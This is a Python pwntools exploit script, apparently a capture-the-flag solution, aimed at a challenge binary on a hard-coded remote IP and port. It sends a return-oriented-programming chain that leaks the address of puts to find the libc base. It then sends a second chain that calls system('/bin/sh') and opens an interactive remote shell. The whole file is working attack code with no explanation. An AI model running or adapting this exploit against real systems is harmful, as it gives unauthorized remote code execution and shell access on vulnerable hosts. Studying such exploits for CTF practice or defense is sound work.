from pwn import *
import ctypes

p = remote("43.202.156.51", 1337)
e = ELF('/mnt/c/Users/Storm/ctf/chall')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def log(n, a) : print('[*]', n, ':', hex(a))

main=0x401130
ret=0x40101a
got_puts=e.got['puts']
plt_puts=e.plt['puts']
pop_rdi=0x401444

payload=p64(0)*12
payload+=p64(1)+p64(pop_rdi)+p64(got_puts)+p64(plt_puts)+p64(main)
payload+=p32(0xffffffff)*10

for i in range(len(payload)//4) :
    p.sendlineafter(b': ', str(u32(payload[i*4:i*4+4])).encode())

while True :
    data=p.recv()
    print(data)
    if(data[:5]==b'input') : p.sendline(b'4294967295')
    else : break

libc_base=u64(data[:6]+b'\x00'*2)-l.symbols['puts']
log('libc_base', libc_base)

binsh=libc_base+next(l.search(b'/bin/sh'))
system=libc_base+l.symbols['system']

payload=p32(0)*23
payload+=p64(1)+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)

p.sendline(b'0')
for i in range(len(payload)//4) :
    p.sendlineafter(b': ', str(u32(payload[i*4:i*4+4])).encode())

for i in range(20) :
    p.sendline(b'4294967295')

p.interactive()